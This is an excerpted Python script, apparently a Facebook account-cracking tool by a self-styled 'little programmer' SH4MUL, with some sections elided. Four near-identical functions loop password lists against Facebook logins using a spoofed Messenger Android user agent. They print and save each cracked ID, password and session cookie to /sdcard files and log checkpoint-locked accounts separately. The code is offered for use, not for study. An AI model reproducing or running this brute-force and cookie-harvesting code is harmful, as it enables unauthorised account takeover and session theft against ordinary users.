#==================[OWNER]==================#
#CODDED BY LITTLE PROGRAMMER SHIMUL
...
logo = f'''
     \033[0;105mC\033[0;92m            
                                                    __  __ ___  ___ _  _ _ _  __  __ _   _ _   \033[0;106mA\033[0;92m 
 \033[0;105mR\033[0;92m |  \/  | _ \/ __| || | | ||  \/  | | | | |               \033[0;104mB\033[0;92m 
 \033[0;105mY\033[0;92m | |\/| |   /\__ \ __ |_  _| |\/| | |_| | |__       \033[0;100mB\033[0;92m
  \033[0;105mB\033[0;92m  |_|  |_|_|_\|___/_||_| |_||_|  |_|\___/|____|\033[1;103mI\033[0;92m
   \033[0;105mE\033[0;92m                                            
   \033[0;105mR\033[0;92m    
                                                                                                                                                                                                                    
              \33[1;30m𝐖ELLCOME TO A LITTLE PROGRAMMER WORLD♚" 
\033[1;37m=====================================================\x1b[1;97m
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m AUTHOR {R}>> {G}MD SHIMUL
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m GITHUB {R}>> {G}MRSH4MUL
...
def mmku():
    clear()
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m EXAMPLE {R}  >> {G}/sdcard/SH4MUL.txt")
    linex()
...
def graph(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [SH4MUL-M1]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(cps)));sys.stdout.flush()
    sys.stdout.flush()
    ...
    try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[SH4MUL-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/SH4MUL-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R} <[SH4MUL-CP]>{B} '+ids+f'{G} |{G} '+pas+'\033[1;97m')
                open('/sdcard/SH4MUL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def graph2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [SH4MUL-M2]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[SH4MUL-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/SH4MUL-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[SH4MUL-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/SH4MUL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
...
def graph3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [SH4MUL-M3]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[SH4MUL-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/SH4MUL-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[SH4MUL-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
...
def graph4(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [SH4MUL-M4]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\033[1;32m[SH4MUL-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/SH4MUL-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[SH4MUL-CP]> '+ids+f' | '+pas+'\033[1;97m')
                open('/sdcard/SH4MUL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
